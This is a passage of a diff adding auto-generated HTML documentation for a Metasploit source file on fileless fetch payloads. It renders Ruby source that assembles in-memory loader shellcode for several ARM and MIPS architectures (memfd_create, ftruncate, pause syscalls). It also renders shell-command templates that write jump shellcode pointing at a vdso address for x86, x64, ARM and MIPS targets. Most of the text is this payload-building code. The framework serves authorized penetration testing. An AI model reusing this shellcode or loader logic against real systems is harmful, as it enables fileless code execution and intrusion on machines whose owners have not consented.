+</span>      <span class='int'>0xe3a0701d</span><span class='comma'>,</span> <span class='comment'>#0x1024:	mov	r7, #0x1d	0xe3a0701d
+</span>      <span class='int'>0xef000000</span><span class='comma'>,</span> <span class='comment'>#0x1028:	svc	#0	0xef000000
+</span>    <span class='rbracket'>]</span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>armbe</span><span class='tstring_end'>&#39;</span></span>
+    <span class='comment'># fd = memfd_create()
+</span>    <span class='comment'># ftruncate(fd, null)
+</span>    <span class='comment'># pause()
+</span>    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+      <span class='int'>0x0020b0e3</span><span class='comma'>,</span> <span class='comment'>#0x1000:	movs	r2, #0	0x0020b0e3
+</span>      <span class='int'>0x04202de5</span><span class='comma'>,</span> <span class='comment'>#0x1004:	str	r2, [sp, #-4]!	0x04202de5
+</span>      <span class='int'>0x0d00a0e1</span><span class='comma'>,</span> <span class='comment'>#0x1008:	mov	r0, sp	0x0d00a0e1
+</span>      <span class='int'>0x0110a0e3</span><span class='comma'>,</span> <span class='comment'>#0x100c:	mov	r1, #1	0x0110a0e3
+</span>      <span class='int'>0x8370a0e3</span><span class='comma'>,</span> <span class='comment'>#0x1010:	mov	r7, #0x83	0x8370a0e3
+</span>      <span class='int'>0xfe7087e2</span><span class='comma'>,</span> <span class='comment'>#0x1014:	add	r7, r7, #0xfe	0xfe7087e2
+</span>      <span class='int'>0x000000ef</span><span class='comma'>,</span> <span class='comment'>#0x1018:	svc	#0	0x000000ef
+</span>      <span class='int'>0x5d70a0e3</span><span class='comma'>,</span> <span class='comment'>#0x101c:	mov	r7, #0x5d	0x5d70a0e3
+</span>      <span class='int'>0x000000ef</span><span class='comma'>,</span> <span class='comment'>#0x1020:	svc	#0	0x000000ef
+</span>      <span class='int'>0x1d70a0e3</span><span class='comma'>,</span> <span class='comment'>#0x1024:	mov	r7, #0x1d	0x1d70a0e3
+</span>      <span class='int'>0x000000ef</span><span class='comma'>,</span> <span class='comment'>#0x1028:	svc	#0	0x000000ef
+</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>mips64</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+      <span class='int'>0x03a02025</span><span class='comma'>,</span> <span class='comment'>#0x1000:	move	$a0, $sp	0x03a02025
+</span>      <span class='int'>0x24050001</span><span class='comma'>,</span> <span class='comment'>#0x1004:	addiu	$a1, $zero, 1	0x24050001
+</span>      <span class='int'>0x240214c2</span><span class='comma'>,</span> <span class='comment'>#0x1008:	addiu	$v0, $zero, 0x14c2	0x240214c2
+</span>      <span class='int'>0x0101010c</span><span class='comma'>,</span> <span class='comment'>#0x100c:	syscall	0x40404	0x0101010c
+</span>      <span class='int'>0x03e02025</span><span class='comma'>,</span> <span class='comment'>#0x1010:	move	$a0, $ra	0x03e02025
+</span>      <span class='int'>0x240213d3</span><span class='comma'>,</span> <span class='comment'>#0x1014:	addiu	$v0, $zero, 0x13d3	0x240213d3
+</span>      <span class='int'>0x0101010c</span><span class='comma'>,</span> <span class='comment'>#0x1018:	syscall	0x40404	0x0101010c
+</span>      <span class='int'>0x240213a9</span><span class='comma'>,</span> <span class='comment'>#0x101c:	addiu	$v0, $zero, 0x13a9	0x240213a9
+</span>      <span class='int'>0x0101010c</span><span class='comma'>,</span> <span class='comment'>#0x1020:	syscall	0x40404	0x0101010c
+</span>    <span class='rbracket'>]</span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>N*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>mipsbe</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+        <span class='int'>0x03a02025</span><span class='comma'>,</span> <span class='comment'>#0x1000:	move	$a0, $sp	0x03a02025
+</span>        <span class='int'>0x24050001</span><span class='comma'>,</span> <span class='comment'>#0x1004:	addiu	$a1, $zero, 1	0x24050001
+</span>        <span class='int'>0x24021102</span><span class='comma'>,</span> <span class='comment'>#0x1008:	addiu	$v0, $zero, 0x1102	0x24021102
+</span>        <span class='int'>0x0101010c</span><span class='comma'>,</span> <span class='comment'>#0x100c:	syscall	0x40404	0x0101010c
+</span>        <span class='int'>0x03e02025</span><span class='comma'>,</span> <span class='comment'>#0x1010:	move	$a0, $ra	0x03e02025
+</span>        <span class='int'>0x24020ffd</span><span class='comma'>,</span> <span class='comment'>#0x1014:	addiu	$v0, $zero, 0xffd	0x24020ffd
+</span>        <span class='int'>0x0101010c</span><span class='comma'>,</span> <span class='comment'>#0x1018:	syscall	0x40404	0x0101010c
+</span>        <span class='int'>0x24020fbd</span><span class='comma'>,</span> <span class='comment'>#0x101c:	addiu	$v0, $zero, 0xfbd	0x24020fbd
+</span>        <span class='int'>0x0101010c</span><span class='comma'>,</span> <span class='comment'>#0x1020:	syscall	0x40404	0x0101010c
+</span>
+    <span class='rbracket'>]</span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>N*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>mipsle</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+        <span class='int'>0x2520a003</span><span class='comma'>,</span> <span class='comment'>#0x1000:	move	$a0, $sp	0x2520a003
+</span>        <span class='int'>0x01000524</span><span class='comma'>,</span> <span class='comment'>#0x1004:	addiu	$a1, $zero, 1	0x01000524
+</span>        <span class='int'>0x02110224</span><span class='comma'>,</span> <span class='comment'>#0x1008:	addiu	$v0, $zero, 0x1102	0x02110224
+</span>        <span class='int'>0x0c010101</span><span class='comma'>,</span> <span class='comment'>#0x100c:	syscall	0x40404	0x0c010101
+</span>        <span class='int'>0x2520e003</span><span class='comma'>,</span> <span class='comment'>#0x1010:	move	$a0, $ra	0x2520e003
+</span>        <span class='int'>0xfd0f0224</span><span class='comma'>,</span> <span class='comment'>#0x1014:	addiu	$v0, $zero, 0xffd	0xfd0f0224
+</span>        <span class='int'>0x0c010101</span><span class='comma'>,</span> <span class='comment'>#0x1018:	syscall	0x40404	0x0c010101
+</span>        <span class='int'>0xbd0f0224</span><span class='comma'>,</span> <span class='comment'>#0x101c:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
+</span>        <span class='int'>0x0c010101</span><span class='comma'>,</span> <span class='comment'>#0x1020:	syscall	0x40404	0x0c010101
+</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_payload'>payload</span> <span class='op'>=</span> <span class='id identifier rubyid_in_memory_loader_asm'>in_memory_loader_asm</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>N*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_fail_with'>fail_with</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module.html" title="Msf::Module (class)">Module</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html" title="Msf::Module::Failure (module)">Failure</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html#BadConfig-constant" title="Msf::Module::Failure::BadConfig (constant)">BadConfig</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Unsupported architecture</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_payload'>payload</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="_generate_jmp_instruction-instance_method">
+  
+    #<strong>_generate_jmp_instruction</strong>(arch)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/fileless.rb', line 148</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_jmp_instruction'>_generate_jmp_instruction</span><span class='lparen'>(</span><span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span>
+  <span class='comment'>#
+</span>  <span class='comment'># The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
+</span>  
+  <span class='kw'>case</span> <span class='id identifier rubyid_arch'>arch</span>
+  <span class='comment'># x64 shellcode
+</span>  <span class='comment'># mov rax, [target address]
+</span>  <span class='comment'># jmp rax
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x64</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;48b8&quot;$(echo $(printf %016x $vdso_addr) | rev | sed -E &#39;s/(.)(.)/\\2\\1/g&#39;)&quot;ffe0&quot;</span><span class='tstring_end'>^</span></span>
+  
+  <span class='comment'># x86 shellcode
+</span>  <span class='comment'># mov eax, [target address]
+</span>  <span class='comment'># jmp eax
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;b8&quot;$(echo $(printf %08x $vdso_addr) | rev | sed -E &#39;s/(.)(.)/\\2\\1/g&#39;)&quot;ffe0&quot;</span><span class='tstring_end'>^</span></span>
+  
+  <span class='comment'># ARM64 shellcode
+</span>  <span class='comment'># ldr x0, #8
+</span>  <span class='comment'># br x0
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>aarch64</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;4000005800001fd6&quot;$(echo $(printf %016x $vdso_addr) | rev | sed -E &#39;s/(.)(.)/\\2\\1/g&#39;)</span><span class='tstring_end'>^</span></span>
+  
+  <span class='comment'># ARMle shelcode
+</span>  <span class='comment'># ldr.w r2, [pc, #4]
+</span>  <span class='comment'># bx    r2 
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>armle</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;dff804201047&quot;$(echo $(printf %04x $vdso_addr) | rev | sed -E &#39;s/(.)(.)/\\2\\1/g&#39;)</span><span class='tstring_end'>^</span></span>
+  
+  <span class='comment'># ARMbe shelcode
+</span>  <span class='comment'># ldr.w r2, [pc, #4]
+</span>  <span class='comment'># bx    r2 
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>armbe</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;f8df20044710&quot;$(echo $(printf %04x $vdso_addr))</span><span class='tstring_end'>^</span></span>
+  
+  <span class='comment'># MIPSEL shellcode
+</span>  <span class='comment'># bgezal $zero, 4
+</span>  <span class='comment'># xor $t2, $t2,$t2
+</span>  <span class='comment'># lw	$t2, 16($ra)
+</span>  <span class='comment'># jr $t2
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>mipsle</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;000011040000000026504a011000ea8f0800400100000000&quot;$(echo $(printf %04x $vdso_addr) | rev | sed -E &#39;s/(.)(.)/\\2\\1/g&#39;)</span><span class='tstring_end'>^</span></span>
+  
+  <span class='comment'># MIPSBE shellcode
+</span>  <span class='comment'># bgezal $zero, 4
+</span>  <span class='comment'># xor $t2, $t2,$t2
+</span>  <span class='comment'># lw	$t2, 16($ra)
+</span>  <span class='comment'># jr $t2
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>mipsbe</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;0411000000000000014a50268fea00100140000800000000&quot;$(echo $(printf %04x $vdso_addr))</span><span class='tstring_end'>^</span></span>
+  
+  <span class='comment'># MIPS64 shellcode
+</span>  <span class='comment'># bgezal $zero, 4
+</span>  <span class='comment'># xor $t2, $t2,$t2
+</span>  <span class='comment'># ld	$t2, 16($ra)
+</span>  <span class='comment'># jr $t2
+</span>  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>mips64</span><span class='tstring_end'>&#39;</span></span>
+    <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>&quot;041100000000000001ce7026dfee001001c0000800000000&quot;$(echo $(printf %016x $vdso_addr))</span><span class='tstring_end'>^</span></span>
+  
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_fail_with'>fail_with</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module.html" title="Msf::Module (class)">Module</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html" title="Msf::Module::Failure (module)">Failure</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html#BadConfig-constant" title="Msf::Module::Failure::BadConfig (constant)">BadConfig</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Unsupported architecture</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Thu Jan 29 04:40:54 2026 by
+  <a href="https://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.37 (ruby-3.1.5).
+</div>
+
+    </div>
+  </body>
+</html>
